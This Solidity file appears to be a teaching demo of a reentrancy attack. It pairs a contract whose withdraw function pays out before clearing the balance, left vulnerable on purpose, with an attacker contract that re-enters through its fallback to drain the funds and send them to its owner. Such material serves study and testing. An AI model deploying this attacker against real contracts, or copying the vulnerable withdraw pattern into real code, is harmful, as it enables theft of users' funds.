// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract ReentrancyVulnerable {
    // Mapping of ether shares of the contract.
    mapping(address => uint256) shares;

    // Vulnerable to reentrancy attack, because it calls an external contract before implementing the effects of the function.
    function withdraw() public {
        (bool success,) = msg.sender.call{value: shares[msg.sender]}("");
        if (success) {
            shares[msg.sender] = 0;
        }
    }

    function deposit() public payable {
        shares[msg.sender] += msg.value;
    }
}

contract ReentrancyAttacker {
    ReentrancyVulnerable vulnerable;
    address owner;

    constructor(ReentrancyVulnerable _vulnerable) {
        vulnerable = _vulnerable;
        owner = msg.sender;
    }

    // Reentrancy attack.
    function attack() public payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw();

        (bool sc,) = owner.call{value: address(this).balance}("");
        require(sc);
    }

    // Fallback function to receive funds.
    fallback() external payable {
        if (address(vulnerable).balance >= msg.value) {
            vulnerable.withdraw();
        }
    }
}
